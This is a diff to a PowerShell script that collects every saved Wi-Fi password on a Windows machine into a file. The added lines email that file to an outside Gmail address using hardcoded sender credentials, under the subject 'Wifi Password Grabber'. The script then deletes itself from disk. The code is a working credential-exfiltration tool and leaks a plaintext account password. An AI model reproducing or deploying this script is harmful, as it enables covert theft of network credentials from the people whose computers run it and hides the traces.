@@ -10,4 +10,15 @@ $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSID
 Out-File wifipass.txt -Append -InputObject $a
 }
 
+$FROM = "m3sanjuann@gmail.com"
+$PASS = "I3S!mail!2k20!"
+$TO = "tomassj9@gmail.com"
+
+$PC_NAME = "$env:computername"
+$SUBJECT = "Wifi Password Grabber - " + $PC_NAME
+$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " are in the attached file."
+$ATTACH = "wifipass.txt"
+
+Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
+
 rm C:\d.ps1
